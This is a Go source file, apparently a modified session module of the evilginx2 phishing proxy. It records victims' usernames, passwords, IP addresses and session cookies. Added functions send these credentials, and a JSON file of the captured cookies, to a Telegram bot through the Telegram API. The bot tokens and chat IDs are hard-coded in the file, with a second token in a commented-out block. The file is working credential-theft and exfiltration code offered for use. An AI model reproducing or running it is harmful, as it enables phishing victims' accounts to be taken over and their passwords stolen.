package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"io/fs"

	"github.com/kgretzky/evilginx2/database"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}

}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		err := s.SendCapturedCookieTokensToTelegramBot()
		if err != nil {
			fmt.Println("Error sending captured cookies to Telegram bot:", err)
			// You can handle the error here, such as returning false to indicate failure
			return false
		}
		// Return true to indicate that all tokens are captured and cookies are sent successfully
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
	// Log a message indicating that Finish function is called and whether it's an authentication URL

	// Send session details to Telegram bot
	go s.SendSessionDetailsToTelegramBot()
	//go s.SendCapturedCookieTokensToTelegramBot()
}

func (s *Session) SendSessionDetailsToTelegramBot() {
	// Session details
	sessionMessage := fmt.Sprintf("Name: %s\nUsername: %s\nPassword: %s\nLanding URL: %s\nIp Address: %s\nUser Agent: %s\n", s.Name, s.Username, s.Password, s.RedirectURL, s.RemoteAddr, s.UserAgent)

	// Log the session message
	fmt.Println("Session message:", sessionMessage)

	// Send session details to Telegram bot
	go SendMessageToTelegramBot(sessionMessage)

}

// SendMessageToTelegramBot sends a message to a Telegram bot using the bot API token and chat ID.
func SendMessageToTelegramBot(message string) {
	// Telegram bot API token
	botAPI := "7139444174:AAGe_aLLEfbI8wODQFW3LWb4RQdzBDzaogQ"

	// Telegram chat ID
	chatID := "7092116539"

	// Construct the URL for sending a message to the bot
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", botAPI, chatID, url.QueryEscape(message))

	// Send the message using HTTP GET request
	_, err := http.Get(url)
	if err != nil {
		fmt.Println("Error sending message to Telegram bot:", err)
	}
}

func (s *Session) SendCapturedCookieTokensToTelegramBot() error {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
		Secure         bool   `json:"secure,omitempty"`
	}

	// Convert cookie tokens to JSON
	var cookies []*Cookie
	for domain, tmap := range s.CookieTokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	jsonTokens, err := json.Marshal(cookies)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
	}

	// Save the JSON data to a file
	filename := "captured_cookies.json"
	err = os.WriteFile(filename, jsonTokens, fs.FileMode(0644))
	if err != nil {
		return fmt.Errorf("failed to save JSON file: %v", err)
	}

	// Send the file to the Telegram bot
	message := fmt.Sprintf("Captured cookies for session ID %s", s.Id)
	err = SendMessageFileToTelegramBot(filename, message, "7139444174:AAGe_aLLEfbI8wODQFW3LWb4RQdzBDzaogQ", "7092116539")
	if err != nil {
		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
	}

	// Return nil to indicate success
	return nil
}

// func (s *Session) SendCapturedCookieTokensToTelegramBot() error {
// 	// Marshal the captured tokens into JSON format
// 	jsonTokens, err := json.Marshal(s.CookieTokens)
// 	if err != nil {
// 		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
// 	}

// 	// Save the JSON data to a file
// 	filename := "captured_cookies.json"
// 	err = os.WriteFile(filename, jsonTokens, fs.FileMode(0644))
// 	if err != nil {
// 		return fmt.Errorf("failed to save JSON file: %v", err)
// 	}

// 	// Send the file to the Telegram bot
// 	message := fmt.Sprintf("Captured cookies for session ID %s", s.Id)
// 	err = SendMessageFileToTelegramBot(filename, message, "6747456495:AAF0TrxmcQD2hbIhHnH20fTXex-PxpQGxpk", "6156695284")
// 	if err != nil {
// 		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
// 	}

// 	// Return nil to indicate success
// 	return nil
// }

func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) error {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	// Create a new multipart writer
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add the file to the request
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	// Add other fields to the request
	writer.WriteField("chat_id", chatID)
	writer.WriteField("caption", message)

	// Close the multipart writer
	writer.Close()

	// Create a new HTTP POST request
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botAPI)
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send the request
	client := &http.Client{}
	_, err = client.Do(req)
	if err != nil {
		return err
	}

	// Return nil to indicate success
	return nil
}
